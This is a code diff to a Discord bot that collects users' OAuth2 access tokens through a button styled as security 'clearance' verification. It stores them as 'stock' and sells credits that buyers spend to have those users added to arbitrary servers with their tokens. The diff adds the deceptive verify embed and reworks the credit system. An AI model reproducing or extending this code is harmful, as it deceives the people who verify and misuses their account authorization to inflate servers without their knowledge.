@@ -7,9 +7,7 @@ const {
   ButtonStyle, 
   ModalBuilder, 
   TextInputBuilder, 
-  TextInputStyle, 
-  StringSelectMenuBuilder, 
-  StringSelectMenuOptionBuilder 
+  TextInputStyle 
 } = require('discord.js');
 const express = require('express');
 const mongoose = require('mongoose');
@@ -23,6 +21,9 @@ const CLIENT_SECRET = process.env.CLIENT_SECRET;
 const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
 const REDIRECT_URI = process.env.REDIRECT_URI || `${PUBLIC_URL}/callback`;
 const MONGO_URI = process.env.MONGO_URI;
+
+// Direct Discord CDN Link for Embed Banner Artwork
+const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1461334969711460587/1568896573084008469/banner.png';
 
 if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
   console.error("❌ [FATAL ERROR]: Missing critical environment variables in Render settings.");
@@ -47,16 +48,15 @@ const userSchema = new mongoose.Schema({
 }, { collection: 'verifiedusers' });
 const VerifiedUser = mongoose.model('VerifiedUser', userSchema);
 
-// User Credit Balances Collection (Streamlined to offline only)
+// User Credit Balances Collection (Dedicated to user allocation)
 const creditSchema = new mongoose.Schema({
   discordId: { type: String, required: true, unique: true },
-  offline: { type: Number, default: 0 }
+  balance: { type: Number, default: 0 }
 }, { collection: 'usercredits' });
 const UserCredit = mongoose.model('UserCredit', creditSchema);
 
-// Active interactive sessions & Cooldown maps
+// Active interactive sessions map
 const activeSessions = new Map();
-const pullCooldowns = new Map();
 
 // ==================== EXPRESS WEB SERVER SETUP ====================
 const app = express();
@@ -217,7 +217,26 @@ client.on('messageCreate', async (message) => {
   const args = message.content.slice(prefix.length).trim().split(/ +/);
   const command = args.shift().toLowerCase();
 
-  // 1. !panel command -> Sends Purchase Ticket panel with Banner Image[cite: 14, 15]
+  // 1. !verify command -> Sends embed with banner image
+  if (command === 'verify') {
+    const embed = new EmbedBuilder()
+      .setColor(0x7000ff)
+      .setTitle('⚡ System Clearance & Verification')
+      .setDescription('Click the secure button below to complete OAuth2 authorization and verify your account.')
+      .setImage(BANNER_IMAGE_URL)
+      .setFooter({ text: 'Abyssal Security Protocol' });
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setLabel('Verify System Clearance')
+        .setStyle(ButtonStyle.Link)
+        .setURL(`${PUBLIC_URL}/verify`)
+    );
+
+    return message.reply({ embeds: [embed], components: [row] });
+  }
+
+  // 2. !panel command -> Sends Purchase Ticket Panel with Banner Image
   if (command === 'panel') {
     if (!message.member.permissions.has('Administrator')) {
       return message.reply('❌ Access Denied: Administrator permissions required.');
@@ -227,7 +246,7 @@ client.on('messageCreate', async (message) => {
       .setColor(0x7000ff)
       .setTitle('Member Purchase Ticket 👥')
       .setDescription('You must buy credits before purchasing members. After buying credits, press **Add Members** to start adding members to your server.\nFast and high-quality service to ensure your satisfaction ❤️.')
-      .setImage('https://cdn.discordapp.com/attachments/1461334968423940250/1568896573084008469/banner.png'); // Embedded user image
+      .setImage(BANNER_IMAGE_URL);
 
     const row = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setLabel('Buy Credits').setStyle(ButtonStyle.Link).setURL(`${PUBLIC_URL}/verify`),
@@ -239,45 +258,46 @@ client.on('messageCreate', async (message) => {
     return message.reply({ embeds: [embed], components: [row] });
   }
 
-  // 2. !gc command -> Admin Credit Distribution (Capped strictly at total verified stock)
+  // 3. !gc command -> Only Admin can grant credits (Capped strictly by DB verified stock)
   if (command === 'gc') {
     if (!message.member.permissions.has('Administrator')) {
-      return message.reply('❌ Access Denied.');
+      return message.reply('❌ Access Denied: Only administrators can grant credits.');
     }
 
     const targetUser = message.mentions.users.first();
     const amount = parseInt(args[1], 10);
 
-    if (!targetUser || isNaN(amount)) {
+    if (!targetUser || isNaN(amount) || amount <= 0) {
       return message.reply('❌ Usage: `!gc @user <amount>`');
     }
 
     const totalStock = await VerifiedUser.countDocuments();
     if (amount > totalStock) {
-      return message.reply(`❌ Error: You cannot give **${amount}** credits. Maximum available stock in database is **${totalStock}**.`);
+      return message.reply(`❌ Error: You cannot grant **${amount}** credits. Maximum available verified stock in database is **${totalStock}**.`);
     }
 
     let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
     if (!userCredit) {
-      userCredit = new UserCredit({ discordId: targetUser.id, offline: 0 });
+      userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
     }
 
-    userCredit.offline += amount;
+    userCredit.balance += amount;
     await userCredit.save();
 
     const embed = new EmbedBuilder()
       .setColor(0x10b981)
-      .setTitle('📦 Credits Received!')
-      .setDescription(`🖤 **${amount.toLocaleString()}** offline credits have been added to your balance!`)
+      .setTitle('📦 Credits Issued!')
+      .setDescription(`🖤 **${amount.toLocaleString()}** credits have been added to <@${targetUser.id}>'s account!`)
       .addFields(
-        { name: 'Your Balance:', value: `⚫ Offline: \`${userCredit.offline}\``, inline: false }
+        { name: 'Current User Balance:', value: `\`${userCredit.balance} credits\``, inline: false },
+        { name: 'Database Stock Remaining:', value: `\`${totalStock} accounts\``, inline: false }
       )
       .setTimestamp();
 
     return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
   }
 
-  // 3. !rc command -> Admin Credit Removal (`!rc @user 500`)
+  // 4. !rc command -> Admin Credit Removal (`!rc @user 500`)
   if (command === 'rc') {
     if (!message.member.permissions.has('Administrator')) {
       return message.reply('❌ Access Denied.');
@@ -286,65 +306,65 @@ client.on('messageCreate', async (message) => {
     const targetUser = message.mentions.users.first();
     const amount = parseInt(args[1], 10);
 
-    if (!targetUser || isNaN(amount)) {
+    if (!targetUser || isNaN(amount) || amount <= 0) {
       return message.reply('❌ Usage: `!rc @user <amount>`');
     }
 
     let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
     if (!userCredit) {
-      userCredit = new UserCredit({ discordId: targetUser.id, offline: 0 });
+      userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
     }
 
-    userCredit.offline = Math.max(0, userCredit.offline - amount);
+    userCredit.balance = Math.max(0, userCredit.balance - amount);
     await userCredit.save();
 
     const embed = new EmbedBuilder()
       .setColor(0xef4444)
       .setTitle('🔻 Credits Deducted')
-      .setDescription(`🖤 **${amount.toLocaleString()}** offline credits have been removed from your balance!`)
+      .setDescription(`🖤 **${amount.toLocaleString()}** credits have been removed from <@${targetUser.id}>'s balance!`)
       .addFields(
-        { name: 'Your Balance:', value: `⚫ Offline: \`${userCredit.offline}\``, inline: false }
+        { name: 'New User Balance:', value: `\`${userCredit.balance} credits\``, inline: false }
       )
       .setTimestamp();
 
     return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
   }
 
-  // 4. !resetcredits command -> Wipe user balance entirely
+  // 5. !resetcredits command -> Wipe user balance entirely
   if (command === 'resetcredits') {
     if (!message.member.permissions.has('Administrator')) return message.reply('❌ Access Denied.');
     const targetUser = message.mentions.users.first();
     if (!targetUser) return message.reply('❌ Usage: `!resetcredits @user`');
 
-    await UserCredit.findOneAndUpdate({ discordId: targetUser.id }, { offline: 0 }, { upsert: true });
+    await UserCredit.findOneAndUpdate({ discordId: targetUser.id }, { balance: 0 }, { upsert: true });
     return message.reply(`✨ Successfully wiped all credits for <@${targetUser.id}>.`);
   }
 
-  // 5. !bal command -> Check Balance (`!bal @user`)
+  // 6. !bal command -> Check Balance (`!bal` or `!bal @user`)
   if (command === 'bal' || command === 'balance') {
     const targetUser = message.mentions.users.first() || message.author;
     let uc = await UserCredit.findOne({ discordId: targetUser.id });
-    if (!uc) uc = { offline: 0 };
+    if (!uc) uc = { balance: 0 };
 
     const embed = new EmbedBuilder()
       .setColor(0x38bdf8)
-      .setTitle(`💳 Balance for ${targetUser.username}`)
+      .setTitle(`💳 Balance Overview — ${targetUser.username}`)
       .addFields(
-        { name: '⚫ Offline Credits', value: `\`${uc.offline}\``, inline: true }
+        { name: 'Available Pull Credits', value: `\`${uc.balance}\``, inline: true }
       )
       .setTimestamp();
 
     return message.reply({ embeds: [embed] });
   }
 
-  // 6. !stock command -> Check Stock
+  // 7. !stock command -> Check Stock
   if (command === 'stock') {
     const totalStock = await VerifiedUser.countDocuments();
     const embed = new EmbedBuilder()
       .setColor(0x8b5cf6)
       .setTitle('📦 Database Stock Overview')
       .addFields(
-        { name: '⚫ Offline Accounts Stock', value: `\`${totalStock}\``, inline: true },
+        { name: '⚫ Total Verified Accounts', value: `\`${totalStock}\``, inline: true },
         { name: '⚡ System Status', value: '`ONLINE // READY`', inline: false }
       )
       .setFooter({ text: 'Abyssal Inventory Engine' })
@@ -353,7 +373,7 @@ client.on('messageCreate', async (message) => {
     return message.reply({ embeds: [embed] });
   }
 
-  // 7. !stats command -> Cyberpunk Neural Telemetry Matrix
+  // 8. !stats command -> Cyberpunk Neural Telemetry Matrix
   if (command === 'stats') {
     const totalUsers = await VerifiedUser.countDocuments();
     const uptimeMs = Date.now() - startTime;
@@ -399,9 +419,9 @@ client.on('interactionCreate', async (interaction) => {
   if (interaction.isButton()) {
     if (interaction.customId === 'btn_my_credits') {
       let uc = await UserCredit.findOne({ discordId: interaction.user.id });
-      if (!uc) uc = { offline: 0 };
+      if (!uc) uc = { balance: 0 };
       return interaction.reply({
-        content: `💳 **Your Balance:**\n⚫ Offline: \`${uc.offline}\``,
+        content: `💳 **Your Balance:** \`${uc.balance}\` credits`,
         ephemeral: true
       });
     }
@@ -426,14 +446,14 @@ client.on('interactionCreate', async (interaction) => {
       const session = activeSessions.get(interaction.user.id);
       if (!session) return interaction.reply({ content: '❌ Session expired. Please start again.', ephemeral: true });
 
-      // Check User Credit Balance before running execution
+      // Verify User Credit Balance before running execution
       let uc = await UserCredit.findOne({ discordId: interaction.user.id });
-      if (!uc || uc.offline < session.quantity) {
-        return interaction.update({ content: '❌ Insufficient offline credits to complete this purchase.', embeds: [], components: [] });
+      if (!uc || uc.balance < session.quantity) {
+        return interaction.update({ content: `❌ Insufficient credits. You need **${session.quantity}** credits, but your balance is **${uc ? uc.balance : 0}**.`, embeds: [], components: [] });
       }
 
-      // Deduct Credits
-      uc.offline -= session.quantity;
+      // DEDUCT CREDITS IMMEDIATELY
+      uc.balance -= session.quantity;
       await uc.save();
 
       await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${session.opId}\``, components: [] });
@@ -448,7 +468,7 @@ client.on('interactionCreate', async (interaction) => {
           if (successful >= session.quantity) break;
           try {
             const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
-            if (member) continue;
+            if (member) continue; // Skip if already in target server
 
             await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
             successful++;
@@ -468,7 +488,7 @@ client.on('interactionCreate', async (interaction) => {
           .setTitle('✅ Members added successfully!')
           .addFields(
             { name: '📊 Accounts Added', value: `\`${successful} accounts\``, inline: true },
-            { name: '🏷️ Account Type', value: '`offline`', inline: true },
+            { name: '💳 Remaining Balance', value: `\`${uc.balance} credits\``, inline: true },
             { name: '⏱️ Time Taken', value: `\`${timeTaken}s\``, inline: true }
           )
           .setTimestamp();
@@ -491,11 +511,11 @@ client.on('interactionCreate', async (interaction) => {
   if (interaction.isModalSubmit()) {
     if (interaction.customId === 'modal_server_id') {
       const serverId = interaction.fields.getTextInputValue('input_server_id');
-      activeSessions.set(interaction.user.id, { serverId, tokenType: 'offline' });
+      activeSessions.set(interaction.user.id, { serverId });
 
       const totalStock = await VerifiedUser.countDocuments();
 
-      // Automatically jump straight to quantity modal since type is locked to offline
+      // Show Quantity Input Modal
       const modal = new ModalBuilder()
         .setCustomId('modal_quantity')
         .setTitle('Buy Members');
@@ -521,10 +541,10 @@ client.on('interactionCreate', async (interaction) => {
       }
 
       let uc = await UserCredit.findOne({ discordId: interaction.user.id });
-      const userBalance = uc ? uc.offline : 0;
+      const userBalance = uc ? uc.balance : 0;
 
       if (quantity > userBalance) {
-        return interaction.reply({ content: `❌ Error: You requested **${quantity}** members, but your balance is only **${userBalance}** credits.`, ephemeral: true });
+        return interaction.reply({ content: `❌ Error: You requested **${quantity}** members, but your current balance is only **${userBalance}** credits.`, ephemeral: true });
       }
 
       session.quantity = quantity;
@@ -539,14 +559,13 @@ client.on('interactionCreate', async (interaction) => {
 
       const confirmEmbed = new EmbedBuilder()
         .setColor(0x10b981)
-        .setTitle(`Confirm Addition — offline`)
+        .setTitle(`Confirm Addition — Member Sync`)
         .addFields(
-          { name: '🏰 Server', value: `${guildName}\n\`${session.serverId}\``, inline: true },
-          { name: '👥 Current Members', value: '0', inline: true },
-          { name: '📦 Available Accounts', value: `${totalStock}`, inline: true },
+          { name: '🏰 Target Server', value: `${guildName}\n\`${session.serverId}\``, inline: true },
+          { name: '📦 Available Stock', value: `${totalStock}`, inline: true },
           { name: '🔢 Add Count', value: `${quantity}`, inline: true },
-          { name: '💵 Cost', value: `${quantity} 📦`, inline: true },
-          { name: '💳 Your Balance', value: `${userBalance} 📦`, inline: true }
+          { name: '💵 Cost', value: `${quantity} Credits`, inline: true },
+          { name: '💳 Your Balance', value: `${userBalance} Credits`, inline: true }
         );
 
       const row = new ActionRowBuilder().addComponents(
